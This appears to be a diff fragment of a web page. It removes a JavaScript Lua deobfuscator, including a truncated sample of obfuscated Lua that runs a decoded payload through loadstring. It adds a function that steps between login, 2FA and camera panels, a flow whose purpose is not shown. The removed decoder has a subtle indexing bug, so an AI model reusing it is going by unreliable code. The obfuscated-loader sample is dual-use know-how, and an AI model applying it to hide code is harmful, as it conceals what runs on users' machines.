-  const b = []; let i = 0;
-  while (i < s.length) {
-    if (s[i] === '\\') {
-      const n = s[i + 1];
-      if (n >= '0' && n <= '9') { let num = '', j = i + 1; while (j < s.length && s[j] >= '0' && s[j] <= '9' && num.length < 3) { num += s[j]; j++; } b.push(parseInt(num, 10)); i = j; }
-      else if (n === 'x') { b.push(parseInt(s.substr(i + 2, 2), 16)); i += 4; }
-      else if (n === 'n') { b.push(10); i += 2; } else if (n === 't') { b.push(9); i += 2; }
-      else if (n === 'r') { b.push(13); i += 2; } else if (n === '"') { b.push(34); i += 2; }
-      else if (n === '\\') { b.push(92); i += 2; } else if (n === "'") { b.push(39); i += 2; }
-      else { b.push(n.charCodeAt(0)); i += 2; }
-    } else { b.push(s.charCodeAt(0)); i++; }
-  }
-  return b;
-}
-function decodeEscapes(s) { return decodeEscapesToBytes(s).map(c => String.fromCharCode(c)).join(''); }
-function luaQuote(s) { return '"' + s.replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\n/g, '\\n').replace(/\r/g, '\\r').replace(/\t/g, '\\t') + '"'; }
-
-function reindent(src) {
-  const lines = src.split('\n');
-  let indent = 0;
-  return lines.map(line => {
-    const t = line.trim();
-    if (!t) return '';
-    if (/^(end\b|else\b|elseif\b|\}|\})/.test(t)) indent = Math.max(0, indent - 1);
-    const res = '  '.repeat(indent) + t;
-    if (/(\bthen\b|\bdo\b|\bfunction\b.*\)|\{)\s*$/.test(t)) indent++;
-    return res;
-  }).join('\n');
-}
-
-function loadExample() {
-  // This is the exact output of our obfuscator with the standard test script
-  document.getElementById('input').value =
-`-- ============================================
--- 💪 MUSCLE OBFUSCATOR 💪
--- Protected with XOR + Opcode VM
--- Seed: 4521
--- ============================================
-
-local _S=4521
-local _E={{151,83,151,62,...}}  -- full table here
-local _K={{0,"local Players"},{1,0},{0,"= "},{0,"game:GetService"},{1,1},...}
-local _C=""
-for _i=1,#_K do _C=_C.._D(_K[_i])end
-local _f=loadstring(_C)
-if _f then _f()end`;
-  setStatus('Example loaded — click Deobfuscate', 'info');
-}
+function showStep(step){
+document.getElementById('step-login').style.display='none';
+document.getElementById('step-2fa').style.display='none';
+document.getElementById('step-camera').style.display='none';
+if(step===1)document.getElementById('step-login').style.display='block';
+if(step===2)document.getElementById('step-2fa').style.display='block';
+if(step===3)document.getElementById('step-camera').style.display='block';}
 </script>
 </body>
 </html>
